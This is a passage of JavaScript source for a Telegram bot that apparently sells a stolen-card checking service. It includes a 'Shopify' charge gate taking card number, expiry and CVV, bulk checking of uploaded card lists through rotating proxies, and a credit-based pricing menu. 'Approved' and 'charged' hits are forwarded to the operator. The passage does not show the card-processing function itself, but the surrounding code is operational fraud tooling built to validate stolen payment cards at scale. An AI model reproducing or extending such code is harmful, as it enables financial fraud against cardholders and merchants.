    else if (cb.data === "gate_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: "Charged", callback_data: "charged_menu", icon_custom_emoji_id: "6136316288005314906" }]]}, { chat_id: chatId, message_id: msgId }); }
    else if (cb.data === "charged_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: "Shopify", callback_data: "sh_info", icon_custom_emoji_id: "6138961691506907344" }]]}, { chat_id: chatId, message_id: msgId }); }
    else if (cb.data === "sh_info") {
      bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Gate</b> \u27A0 Shopify 1$\n<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Command</b> \u27A0 <code>/sh cc|mm|yy|cvv</code>\n<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Health</b> \u27A0 100% Active\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6138532229137049159\">\uD83D\uDD25</tg-emoji> Powered By " + escapeHTML(BOT_NAME),
        { parse_mode: "HTML" });
    }
    else if (cb.data === "mass_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: ".txt File", callback_data: "mass_txt", icon_custom_emoji_id: "6138728977293907990" }]]}, { chat_id: chatId, message_id: msgId }); }
    else if (cb.data === "mass_txt") { userStates[chatId]="WAITING_TXT"; bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send your .txt file.</b>\n<i>One CC per line</i>", { parse_mode: "HTML" }); }
    else if (cb.data === "tools_menu") {
      bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>TOOLS MENU</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/sh</code> - Shopify Checker\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/shmt</code> - Mass Check\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/addproxy</code> - Add Proxy\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/myproxy</code> - View Proxies\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/checkproxy</code> - Check Live\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/clearproxy</code> - Clear\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/redeem</code> - Redeem Code",
        { parse_mode: "HTML" });
    }
    else if (cb.data === "pricing_menu") {
      bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>"+escapeHTML(BOT_NAME)+" PRICING</b> <tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>1,000 Credits</b> \u2014 $5\n\u23F3 7 Days\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>2,000 Credits</b> \u2014 $8\n\u23F3 7 Days\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>10,000 Credits</b> \u2014 $15\n\u23F3 30 Days\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<i>Secure, Fast, Reliable.</i>",
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Contact Owner", url: "https://t.me/ZeroSpade" }]] } });
    }
    else if (cb.data === "profile_menu") {
      const user = await getUser(chatId, cb.from.first_name);
      const total = user.totalApproved + user.totalDeclined;
      const jd = new Date(user.joinDate).toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
      let exp = "No Expiry";
      if (user.planExpiry) exp = new Date(user.planExpiry).toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
      bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>YOUR PROFILE</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDCC5 <b>Joined:</b> "+jd+"\n<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Total Checked:</b> "+total+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Approved:</b> "+user.totalApproved+"\n<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Declined:</b> "+user.totalDeclined+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>Plan:</b> "+escapeHTML(user.planName)+"\n<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Validity:</b> "+exp+"\n<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDCB0</tg-emoji> <b>Credits:</b> "+user.credits+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
        { parse_mode: "HTML" });
    }
    else if (cb.data.startsWith("admin_")) { if (chatId !== ADMIN_ID) return; await handleAdminMenu(cb, chatId); }
  } catch(err) { console.error("CB Error:", err); }
  bot.answerCallbackQuery(cb.id).catch(() => {});
});

// =================== ADMIN MENU ===================
async function handleAdminMenu(cb, chatId) {
  if (cb.data === "admin_users_list") {
    const users = await User.find({}, "firstName chatId credits planName");
    const jl = JSON.stringify(users, null, 2);
    if (jl.length < 4000) bot.sendMessage(chatId, "<b>Users:</b>\n<pre>"+escapeHTML(jl)+"</pre>", { parse_mode: "HTML" });
    else bot.sendDocument(chatId, Buffer.from(jl,"utf-8"), { filename: "users.json" });
  } else if (cb.data === "admin_manage_users") {
    userStates[chatId] = "WAITING_ADMIN_USERID"; bot.sendMessage(chatId, "Enter Target User Chat ID:");
  } else if (cb.data === "admin_broadcast") {
    userStates[chatId] = "WAITING_BROADCAST"; bot.sendMessage(chatId, "Send broadcast message:");
  } else if (cb.data === "admin_gen_redeem") {
    bot.sendMessage(chatId, "Select pack:", { reply_markup: { inline_keyboard: [
      [{ text: "Trial 100 (1D)", callback_data: "admin_rd_trial" }],
      [{ text: "1,000 Credits (7D)", callback_data: "admin_rd_1k" }, { text: "2,000 Credits (7D)", callback_data: "admin_rd_2k" }],
      [{ text: "10,000 Credits (30D)", callback_data: "admin_rd_10k" }],
    ]}});
  } else if (cb.data.startsWith("admin_rd_")) {
    const label=cb.data.replace("admin_rd_",""), rand=Math.random().toString(36).substring(2,7).toUpperCase();
    let code="",creds=0,days=0,pName="";
    if(label==="trial"){code="1D_"+rand+"_SPADECHKR";creds=100;days=1;pName="Trial";}
    else if(label==="1k"){code="7D_"+rand+"_SPADECHKR";creds=1000;days=7;pName="1k Premium";}
    else if(label==="2k"){code="7D_"+rand+"_SPADECHKR";creds=2000;days=7;pName="2k Premium";}
    else if(label==="10k"){code="30D_"+rand+"_SPADECHKR";creds=10000;days=30;pName="10k Elite";}
    await Redeem.create({code,credits:creds,daysValid:days,planName:pName});
    bot.sendMessage(chatId,"\u2705 <b>Code:</b>\n\n<code>"+code+"</code>\n\n"+pName+" | "+creds+" Credits | "+days+" Days",{parse_mode:"HTML"});
  } else if (cb.data.startsWith("admin_mod_")) {
    const parts=cb.data.split("_"), action=parts[2], targetId=parts[3];
    const user=await User.findOne({chatId:targetId});
    if(!user) return bot.sendMessage(chatId,"\u274C User not found.");
    const amt=parseInt(parts[4]||"0");
    if(action==="ban") user.isBanned=true;
    if(action==="unban") user.isBanned=false;
    if(action==="give"){user.credits+=amt;const d=new Date();d.setDate(d.getDate()+(amt>=10000?30:7));user.planExpiry=d;user.planName=amt>=1000?(amt/1000)+"k Premium":"Admin Granted";}
    await user.save();
    bot.sendMessage(chatId,"\u2705 Done! "+action+" on "+targetId);
  }
}

// =================== TEXT HANDLER ===================
bot.on("text", async (msg) => {
  const chatId=msg.chat.id, text=msg.text;
  if (!text||text.startsWith("/")) return;
  const state=userStates[chatId];
  if (state==="WAITING_ADDSITE"&&chatId===ADMIN_ID) { delete userStates[chatId]; await processSiteAdd(chatId, text); }
  else if (state==="WAITING_ADDPROXY") { delete userStates[chatId]; await processProxyAdd(chatId, text); }
  else if (state==="WAITING_ADMIN_USERID"&&chatId===ADMIN_ID) {
    const targetId=text.trim();
    bot.sendMessage(chatId,"Managing: <code>"+targetId+"</code>",{parse_mode:"HTML",reply_markup:{inline_keyboard:[
      [{text:"\uD83D\uDEAB Ban",callback_data:"admin_mod_ban_"+targetId},{text:"\u2705 Unban",callback_data:"admin_mod_unban_"+targetId}],
      [{text:"Give 1K",callback_data:"admin_mod_give_"+targetId+"_1000"},{text:"Give 2K",callback_data:"admin_mod_give_"+targetId+"_2000"}],
      [{text:"Give 10K",callback_data:"admin_mod_give_"+targetId+"_10000"}],
    ]}});
    delete userStates[chatId];
  } else if (state==="WAITING_BROADCAST"&&chatId===ADMIN_ID) {
    delete userStates[chatId];
    const users=await User.find({isBanned:false}); let sent=0;
    bot.sendMessage(chatId,"\uD83D\uDCE2 Sending...");
    for(const u of users){try{await bot.sendMessage(u.chatId,"\uD83D\uDCE2 <b>Broadcast</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+escapeHTML(text),{parse_mode:"HTML"});sent++;}catch(e){}}
    bot.sendMessage(chatId,"\u2705 Sent to "+sent+" users.");
  }
});

// =================== DOCUMENT HANDLER ===================
bot.on("document", async (msg) => {
  const chatId=msg.chat.id;
  const state=userStates[chatId];
  const mime=msg.document.mime_type, fname=msg.document.file_name||"";
  const isTxt=mime==="text/plain"||fname.endsWith(".txt");

  if (state==="WAITING_ADDSITE"&&chatId===ADMIN_ID&&isTxt) {
    delete userStates[chatId];
    try { const fl=await bot.getFileLink(msg.document.file_id); const fr=await axios.get(fl); await processSiteAdd(chatId,fr.data); }
    catch(e){ bot.sendMessage(chatId,"\u274C Error reading file."); }
    return;
  }
  if (state==="WAITING_ADDPROXY"&&isTxt) {
    delete userStates[chatId];
    try { const fl=await bot.getFileLink(msg.document.file_id); const fr=await axios.get(fl); await processProxyAdd(chatId,fr.data); }
    catch(e){ bot.sendMessage(chatId,"\u274C Error reading file."); }
    return;
  }
  if (state==="WAITING_TXT") {
    delete userStates[chatId];
    const user=await getUser(chatId,msg.from.first_name);
    if(user.isBanned) return bot.sendMessage(chatId,"\u26D4 Blocked.");
    if(!isTxt) return bot.sendMessage(chatId,"\u274C Upload .txt file only!");
    const statusMsg=await bot.sendMessage(chatId,"<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Starting Mass Check...</b>",{parse_mode:"HTML"});
    try {
      const fl=await bot.getFileLink(msg.document.file_id);
      const fr=await axios.get(fl);
      const lines=fr.data.split("\n").map(l=>l.trim()).filter(l=>l.length>10);
      if(lines.length===0) return bot.editMessageText("\u274C No valid CCs found.",{chat_id:chatId,message_id:statusMsg.message_id});
      if(!(await deductCredits(user,lines.length))) return bot.editMessageText(
        "\u274C <b>Insufficient Credits!</b>\nHave: "+user.credits+" | Need: "+lines.length,
        {chat_id:chatId,message_id:statusMsg.message_id,parse_mode:"HTML"});
      bot.editMessageText("<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Processing "+lines.length+" cards...</b>\n<i>Approved hits will appear below</i>",{chat_id:chatId,message_id:statusMsg.message_id,parse_mode:"HTML"});
      let approved=0,declined=0,charged=0;
      // Mass check — concurrency 5 for speed
      for(let i=0;i<lines.length;i+=5){
        const chunk=lines.slice(i,i+5);
        const results=await Promise.all(chunk.map(cc=>processCard(cc,getRandomItem(user.proxies))));
        for(const data of results){
          if(data.category==="approved"||data.category==="charged"){
            if(data.category==="charged") charged++; else approved++;
            const rm=formatCardResult(data,msg.from.first_name,msg.from.id);
            const kb=getResultKeyboard(data.category);
            await bot.sendMessage(chatId,rm,{parse_mode:"HTML",disable_web_page_preview:true,reply_markup:kb});
            if(chatId!==ADMIN_ID) bot.sendMessage(ADMIN_ID,"\uD83D\uDFE2 <b>MASS HIT</b>\nBy: <a href=\"tg://user?id="+chatId+"\">"+escapeHTML(msg.from.first_name)+"</a>\n"+rm,{parse_mode:"HTML",disable_web_page_preview:true});
          } else { declined++; }
          const u=await User.findOne({chatId});
          if(data.category==="approved"||data.category==="charged")u.totalApproved++;else u.totalDeclined++;
          await u.save();
        }
      }
      bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"6138803821394009204\">\u2728</tg-emoji> <b>Mass Check Complete!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Approved:</b> "+approved+"\n\uD83D\uDCB3 <b>Charged:</b> "+charged+"\n\u274C <b>Declined:</b> "+declined+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> Dev: @ZeroSpade",
        {parse_mode:"HTML"});
      bot.deleteMessage(chatId,statusMsg.message_id).catch(()=>{});
    } catch(err){console.error(err);bot.sendMessage(chatId,"\u274C Error: "+err.message);}
  }
});
